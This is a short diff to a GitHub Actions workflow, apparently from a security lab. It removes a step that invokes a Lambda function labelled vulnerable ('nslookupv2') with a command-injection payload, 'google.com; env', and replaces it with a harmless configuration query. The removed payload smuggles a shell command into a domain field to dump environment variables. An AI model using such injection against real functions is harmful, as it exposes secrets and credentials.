@@ -28,12 +28,4 @@ jobs:
 
       # Invoke the vulnerable Lambda function (nslookupv2) with our payload
       - name: Invoke Lambda and Inject Command
-        run: |
-          aws lambda invoke \
-            --function-name nslookupv2 \
-            --cli-binary-format raw-in-base64-out \
-            --payload '{"domain": "google.com; env"}' \
-            response.json
-            
-          echo "Lambda Response:"
-          cat response.json
+        run: aws lambda get-function-url-config --function-name nslookupv2
